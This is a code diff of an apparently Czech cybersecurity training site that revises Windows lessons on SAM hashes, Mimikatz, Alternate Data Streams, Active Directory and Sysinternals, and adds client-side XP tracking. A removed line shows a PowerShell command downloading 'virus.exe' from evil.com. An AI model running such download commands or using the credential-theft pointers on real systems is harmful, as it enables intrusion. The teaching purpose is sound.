+                quiz: { q: "Čím musí začínat každý Bash skript?", options: ["// start", "#!/bin/bash", "<script>"], correct: 1 }
             },
 
-            // --- PHASE 5 ---
+            // --- PHASE 5: WINDOWS ---
             {
                 id: '16', title: "Windows Fundamentals pt1", icon: "🪟", tag: "Windows",
-                desc: "NTFS, File System, User Accounts.",
+                desc: "Kde jsou hesla? SAM, NTLM a Alternate Data Streams.",
                 content: `
-                    <h2>Svět podle Microsoftu</h2>
-                    
-                    <h3>NTFS Permissions</h3>
-                    <p>Windows má složitější systém práv než Linux. Dědění (Inheritance), ACLs (Access Control Lists). Hacker hledá špatně nastavená práva, aby se dostal k citlivým souborům.</p>
+                    <h2>Kde jsou hesla?</h2>
+                    <p>Windows neukládá hesla v textu, ale jako HASH (NTLM) v souboru <strong>SAM</strong> (Security Account Manager).</p>
+                    <p>Cesta: <code>C:\\Windows\\System32\\config\\SAM</code>.</p>
+                    <p>Tento soubor je za běhu systému zamčený. Hackeři se ho snaží ukrást (např. pomocí Mimikatz), aby crackli hesla offline.</p>
 
-                    <h3>UAC (User Account Control)</h3>
-                    <p>To otravné okno "Chcete povolit aplikaci provést změny?". Chrání před spuštěním malwaru s právy Admina. Obcházení UAC (UAC Bypass) je běžná disciplína.</p>
+                    <h3>ADS (Alternate Data Streams)</h3>
+                    <p>Vlastnost NTFS, která umožňuje schovat soubor "za" jiný soubor. Soubor <code>readme.txt</code> může mít za sebou schovaný virus <code>readme.txt:virus.exe</code>.</p>
                 `,
-                quiz: { q: "Co je UAC?", options: ["User Access Control", "User Account Control", "Universal Admin Code"], correct: 1 }
+                quiz: { q: "V jakém souboru Windows ukládá hashe lokálních hesel?", options: ["PASSWD", "SHADOW", "SAM"], correct: 2 }
             },
             {
-                id: '17', title: "Windows Fundamentals pt2", icon: "🪟", tag: "Windows",
-                desc: "PowerShell, Active Directory Basics.",
+                id: '17', title: "Active Directory", icon: "🪟", tag: "Windows",
+                desc: "Domain Controller, Kerberos, Group Policy.",
                 content: `
                     <h2>Active Directory (AD)</h2>
-                    <p>Srdce každé velké firmy. Centrální databáze všech uživatelů a počítačů. </p>
-                    <p>Když hacknete <strong>Domain Controller</strong> (server s AD), ovládáte celou firmu.</p>
-
-                    <h3>PowerShell pro Hackery</h3>
-                    <code>Invoke-WebRequest -Uri "http://evil.com/virus.exe" -OutFile "virus.exe"</code>
-                    <p>Toto stáhne soubor z internetu. PowerShell je extrémně silný nástroj pro "Live off the land" útoky (použití nástrojů, které už v systému jsou).</p>
+                    <p>Firemní síť není jen hromada PC. Je to struktura.</p>
+                    <ul>
+                        <li><strong>Domain Controller (DC):</strong> Král. Server, který všechny řídí.</li>
+                        <li><strong>GPO (Group Policy Object):</strong> Pravidla. "Všichni musí mít tapetu HackShield a vypnuté USB porty." Aplikuje se z DC na všechny PC.</li>
+                        <li><strong>Kerberos:</strong> Protokol pro ověřování (Authentication). Používá "Ticket", ne posílání hesel.</li>
+                    </ul>
                 `,
-                quiz: { q: "Jak se nazývá hlavní server spravující Active Directory?", options: ["Master Server", "Domain Controller", "Root Node"], correct: 1 }
+                quiz: { q: "Který protokol používá AD pro ověřování (lístky)?", options: ["NTLMv1", "Kerberos", "LoudSpeak"], correct: 1 }
             },
             {
-                id: '18', title: "Windows Fundamentals pt3", icon: "🪟", tag: "Windows",
-                desc: "Sysinternals, Logs, Defender.",
+                id: '18', title: "Sysinternals & Logs", icon: "🪟", tag: "Windows",
+                desc: "ProcMon, TCPView, Autoruns. Hledání malwaru.",
                 content: `
-                    <h2>Windows Internals</h2>
-                    
-                    <h3>Event Viewer</h3>
-                    <p>Vše, co se ve Windows stane, je zapsáno v logu (Event Logs). Security log (Event ID 4624 = Úspěšné přihlášení, 4625 = Neúspěšné).</p>
-                    <p>První věc, kterou hacker udělá? Snaží se smazat logy.</p>
+                    <h2>Lovíme malware</h2>
+                    <p>Když se PC chová divně, Task Manager nestačí.</p>
 
-                    <h3>Sysinternals Suite</h3>
-                    <p>Sada nástrojů od Microsoftu (Mark Russinovich) pro hloubkovou analýzu. ProcExp (Process Explorer), ProcMon (Process Monitor).</p>
+                    <h3>Sysinternals Tools</h3>
+                    <ul>
+                        <li><strong>Process Explorer:</strong> Ukazuje strom procesů. Vidíte, že <code>chrome.exe</code> spustil <code>powershell.exe</code>? To je podezřelé!</li>
+                        <li><strong>TCPView:</strong> Jaký proces komunikuje s internetem? Pokud <code>notepad.exe</code> posílá data do Ruska, máte problém.</li>
+                        <li><strong>Autoruns:</strong> Co vše se spouští po startu Windows. Malware se tu vždy snaží zapsat.</li>
+                    </ul>
                 `,
-                quiz: { q: "Který Event ID značí neúspěšné přihlášení?", options: ["4624", "4625", "1337"], correct: 1 }
+                quiz: { q: "Který nástroj byste použili pro zjištění, jaký proces posílá data na internet?", options: ["Process Monitor", "TCPView", "Regedit"], correct: 1 }
             }
         ];
 
@@ -761,21 +781,43 @@ cd ~       # Domů (Home Directory)</code>
             if (idx === currentCourse.quiz.correct) {
                 el.classList.add('correct');
 
-                // SAVE PROGRESS
+                // 1. SAVE LOCAL PROGRESS (Client Side)
                 let savedProgress = JSON.parse(localStorage.getItem('hackshield_progress')) || [];
                 if (!savedProgress.includes(currentCourse.id)) {
                     savedProgress.push(currentCourse.id);
                     localStorage.setItem('hackshield_progress', JSON.stringify(savedProgress));
 
+                    // 2. SAVE SERVER PROGRESS (XP & Level)
+                    const user = JSON.parse(localStorage.getItem('hackshield_user'));
+                    if (user && user.id) {
+                        fetch('/api/progress', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ userId: user.id, xpGain: 50 }) // 50 XP per course
+                        })
+                            .then(res => res.json())
+                            .then(data => {
+                                if (data.success) {
+                                    let msg = `Splněno! Získal jsi +50 XP. (Celkem: ${data.newXp})`;
+                                    if (data.leveledUp) {
+                                        msg += `\n🎉 LEVEL UP! Nyní jsi Level ${data.newLevel}! 🎉`;
+                                    }
+                                    alert(msg);
+                                }
+                            })
+                            .catch(err => console.error("XP Save failed:", err));
+                    }
+
                     // Re-render UI to update green square
                     renderCourses();
+                } else {
+                    alert("Tento kurz už máš hotový. (Žádné nové XP)");
                 }
 
-                // Optional delay to close or celebrate
+                // Close modal after delay
                 setTimeout(() => {
-                    // alert("Splněno!");
-                    // closeCourse();
-                }, 1000);
+                    closeCourse();
+                }, 1500);
 
             } else {
                 el.classList.add('wrong');
